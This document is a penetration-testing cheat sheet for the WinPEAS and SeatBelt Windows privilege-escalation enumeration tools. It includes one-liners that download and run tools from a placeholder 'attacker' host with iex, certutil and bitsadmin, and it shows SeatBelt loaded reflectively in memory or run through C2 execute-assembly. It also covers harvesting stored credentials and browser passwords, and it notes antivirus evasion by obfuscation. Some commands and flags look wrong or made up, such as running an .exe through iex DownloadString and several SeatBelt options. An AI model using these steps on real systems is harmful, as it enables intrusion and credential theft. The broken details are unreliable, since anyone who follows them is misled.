# <span style="color:rgb(255, 192, 0)">WinPEAS & SeatBelt - Complete Command Reference</span>

WinPEAS and SeatBelt are Windows privilege escalation enumeration tools. WinPEAS is a binary (WinPEAS.exe/WinPEAS.bat), SeatBelt is a C# assembly.

---

## <span style="color:rgb(255, 0, 0)">WinPEAS</span>

WinPEAS by @carlospolop searches for local privilege escalation paths on Windows.

**Download:**
```bash
# Releases
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
```

### Basic Usage

```powershell
# Quick check (all checks)
winPEASx64.exe

# Run specific checks only
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe processinfo

# Output to file
winPEASx64.exe > output.txt

# Quiet mode
winPEASx64.exe quiet

# Colors (off to avoid issues)
winPEASx64.exe cmd  # Windows CMD coloring
winPEASx64.exe ps   # PowerShell coloring
```

### Cheats for Specific Checks

```powershell
# Services info
winPEASx64.exe servicesinfo

# Applications info
winPEASx64.exe applicationsinfo

# Network info
winPEASx64.exe networkinfo

# Windows Defender info
winPEASx64.exe windowsdefender

# Credential searches
winPEASx64.exe credits
winPEASx64.exe creds

# File system searches
winPEASx64.exe filesinfo
```

### Check Categories

```yaml
System Information:
  - OS version, architecture, build
  - Hotfixes, patches missing
  - Basic system info
  
User Information:
  - Current user, groups, privileges
  - Logged users, home folders
  - Token privileges (SeImpersonate, SeAssignPrimaryToken, etc.)
  
Process Information:
  - Running processes (non-Microsoft)
  - Running services (non-default)
  
Services Information:
  - Services with weak permissions
  - Unquoted service paths
  - Service binaries writable
  
Applications:
  - Installed software
  - Running as admin/system
  
Network Information:
  - Active connections
  - Listening ports
  - DNS, hosts file
  
Windows Defender:
  - Defender status
  - Exclusions (paths, extensions, processes)
  
Credentials:
  - Registry auto-administrador-logon
  - Saved credentials
  - Credential Manager
  - DPAPI master keys
  
Files:
  - Interesting files (backup, pass, password, etc.)
  - Unattended install files
  - Web.config files
  
Potentially Vulnerable Software:
  - Kernel exploits
  - UAC configuration
  - AlwaysInstallElevated
  - AlwaysLoadedModules
```

### One-Liners

```powershell
# Download and execute
iex (New-Object Net.WebClient).DownloadString('http://attacker/winPEASx64.exe')

# Via certutil
certutil -urlcache -f http://attacker/winPEASx64.exe winPEAS.exe && winPEAS.exe

# Via bitsadmin
bitsadmin /transfer job /download /priority high http://attacker/winPEASx64.exe C:\Temp\winPEAS.exe
C:\Temp\winPEAS.exe

# Silent execution
winPEASx64.exe quiet > C:\Temp\results.txt
```

### WinPEAS.bat (Batch)

```powershell
# Launcher script (downloads and runs appropriate binary)
winPEAS.bat

# Use when binary is blocked
winPEAS.bat
```

---

## <span style="color:rgb(0, 176, 240)">SeatBelt</span>

SeatBelt by @GhostPack (@harmj0y) is a C# security audit tool that checks Windows configurations.

### Compiling

```bash
# From source
git clone https://github.com/GhostPack/Seatbelt.git
cd Seatbelt
# Open in Visual Studio and build
# Or use csc:
csc.exe /unsafe /reference:System.DirectoryServices.dll Seatbelt.cs
```

### Loading SeatBelt

```powershell
# Binary drop
Seatbelt.exe

# Execute-assembly (C2)
execute-assembly Seatbelt.exe

# PowerShell reflection
$data = (New-Object Net.WebClient).DownloadData('http://attacker/Seatbelt.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Seatbelt.Program]::Main("all".Split())
```

### Commands

```powershell
# Run ALL security checks
Seatbelt.exe -group=all

# Run all user-focused checks
Seatbelt.exe -group=user

# Run all system-focused checks
Seatbelt.exe -group=system

# Slack channel output format
Seatbelt.exe -group=all --slack

# Output to file
Seatbelt.exe -group=all -outputfile="C:\Temp\results.txt"
```

### Individual Checks

```powershell
# System checks
Seatbelt.exe OSInfo
Seatbelt.exe InstalledUpdates
Seatbelt.exe WindowsAutoLogon
Seatbelt.exe UAC
Seatbelt.exe LSAProtections
Seatbelt.exe CredentialGuard
Seatbelt.exe WindowsDefender
Seatbelt.exe AppLocker
Seatbelt.exe PowerShellSettings
Seatbelt.exe AuditPolicies
Seatbelt.exe LAPS
Seatbelt.exe WEF
Seatbelt.exe WSUS

# User checks
Seatbelt.exe UserInfo
Seatbelt.exe LogonSessions
Seatbelt.exe NetworkProfiles
Seatbelt.exe ChromeBookmarks
Seatbelt.exe ChromeHistory
Seatbelt.exe CloudCredentials
Seatbelt.exe PuTTYSessions
Seatbelt.exe SavedRDPConnections
Seatbelt.exe RecentFiles
Seatbelt.exe RunMRU

# Environment checks
Seatbelt.exe EnvironmentPath
Seatbelt.exe InterestingProcesses
Seatbelt.exe InternetSettings

# Token checks
Seatbelt.exe TokenGroup
Seatbelt.exe TokenPrivileges

# Service checks
Seatbelt.exe NonMicrosoftServices
Seatbelt.exe UnquotedPaths
Seatbelt.exe WeakServicePermissions
Seatbelt.exe ModifiableServices
Seatbelt.exe ModifiableServiceBinaries
Seatbelt.exe ScheduledTasks

# File checks
Seatbelt.exe WindowsEventForwarding
Seatbelt.exe ExplicitLogonEvents
Seatbelt.exe PowerShellEvents
Seatbelt.exe SecurityEvents

# Registry checks
Seatbelt.exe AlwaysInstallElevated
Seatbelt.exe EnterpriseInstallApps

# Network checks
Seatbelt.exe NetworkShares
Seatbelt.exe DNSCache
Seatbelt.exe ARPTable
Seatbelt.exe hostsFile

# Credential checks
Seatbelt.exe WindowsCredentialManager
Seatbelt.exe VaultCreds
Seatbelt.exe SavedCredentialsByAP
Seatbelt.exe DPAPI
Seatbelt.exe BrowserCreds
Seatbelt.exe FirefoxPasswords
Seatbelt.exe ChromePasswords

# Misc
Seatbelt.exe MachineInfo
Seatbelt.exe LocalGroupMembers
Seatbelt.exe WMI
Seatbelt.exe COM
Seatbelt.exe InstalledApps
Seatbelt.exe Hotfixes
Seatbelt.exe Sysmon
Seatbelt.exe SQLInstances
```

### Group Selection

```powershell
# Pre-defined groups
-g, --group=user       # User-focused checks
-g, --group=system     # System-focused checks
-g, --group=all        # All checks
-g, --group=slack      # Slack-output formatted

# Example
Seatbelt.exe -g=user
Seatbelt.exe -g=system -outputfile=system_audit.txt
Seatbelt.exe -g=all -outputfile=full_audit.txt
```

### Full Parameters

```powershell
Seatbelt.exe -h

-g, --group GROUP    Group name to run
--full               Run full evaluation
-o, --outputfile FILE  Output to file
--slack              Slack output format
--quiet              Quiet mode (errors only)
--help               Help
```

---

## <span style="color:rgb(146, 208, 80)">WinPEAS vs SeatBelt Comparison</span>

| Feature | WinPEAS | SeatBelt |
|---------|---------|----------|
| Language | C/C++ (binary) | C# (.NET) |
| AV Detection | Higher (popular binary) | Lower (can be obfuscated) |
| Execute | Direct .exe | .exe or execute-assembly |
| Coverage | Very broad (100+ checks) | Broad (75+ checks) |
| File search | Yes (auto) | Limited / manual |
| Credential search | Yes (filesystem) | Yes (specific targets) |
| Output coloring | OS-specific | Slack-friendly |
| AlwaysInstallElevated | Yes | Yes |
| Unquoted service paths | Yes | Yes |
| Token privileges | Yes | Yes |
| Browser credentials | Yes | Yes |
| Cloud credentials | Yes | Yes |
| Windows Defender | Yes | Yes |
| AppLocker | Yes | Yes |
| LAPS | Yes | Yes |

---

## <span style="color:rgb(255, 0, 0)">Common Workflows</span>

### Initial Privesc Enumeration

```powershell
# WinPEAS
winPEASx64.exe quiet systeminfo userinfo > C:\Temp\enum.txt

# SeatBelt
Seatbelt.exe -g=all -outputfile=C:\Temp\seatbelt.txt
```

### Specific Checks for Known Vectors

```powershell
# AlwaysInstallElevated
Seatbelt.exe AlwaysInstallElevated
winPEASx64.exe > output.txt  # Check the "Applications" section

# Token Privileges
Seatbelt.exe TokenPrivileges
winPEASx64.exe userinfo | findstr "Impersonate"

# Unquoted Service Paths
Seatbelt.exe UnquotedPaths
winPEASx64.exe servicesinfo

# Weak Service Permissions
Seatbelt.exe WeakServicePermissions
winPEASx64.exe servicesinfo

# Credential Hunting (filesystem)
winPEASx64.exe filesinfo
Seatbelt.exe WindowsCredentialManager
Seatbelt.exe VaultCreds

# UAC Settings
Seatbelt.exe UAC
winPEASx64.exe systeminfo
```

### Automated Full Audit

```powershell
# Download both
certutil -urlcache -f http://attacker/winPEASx64.exe winPEAS.exe
certutil -urlcache -f http://attacker/Seatbelt.exe Seatbelt.exe

# Run both
winPEAS.exe quiet > winpeas_output.txt
Seatbelt.exe -g=all -outputfile=seatbelt_output.txt
```
